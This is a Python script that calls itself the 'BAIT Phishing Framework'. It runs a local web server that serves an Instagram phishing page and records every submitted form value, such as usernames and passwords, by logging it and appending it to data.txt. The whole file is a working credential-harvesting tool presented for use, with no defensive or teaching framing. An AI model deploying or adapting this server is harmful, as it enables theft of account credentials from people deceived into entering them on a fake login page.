import socketserver
import http.server
import logging
import cgi

PORT = 8080

class ServerHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        logging.error(self.headers)
        http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        logging.error(self.headers)
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        for item in form.list:
            logging.error(item)
        http.server.SimpleHTTPRequestHandler.do_GET(self)

        with open("data.txt", "a") as file:
            for key in form.keys():
                file.write(str(form.getvalue(str(key))) + " ")
            file.write("\n")

print('-'*50 + "\n")
print("BAIT Phishing Framework - by polgs\n")
print('-'*50)

print("Serving Instagram phish at src/ig/, port:" + str(PORT) +"\n\n")

Handler = ServerHandler

httpd = socketserver.TCPServer(("", PORT), Handler)

print("serving at port", PORT)
try:
    httpd.serve_forever()
except KeyboardInterrupt:
    pass
httpd.server_close()
print('Stopping httpd server...\n')
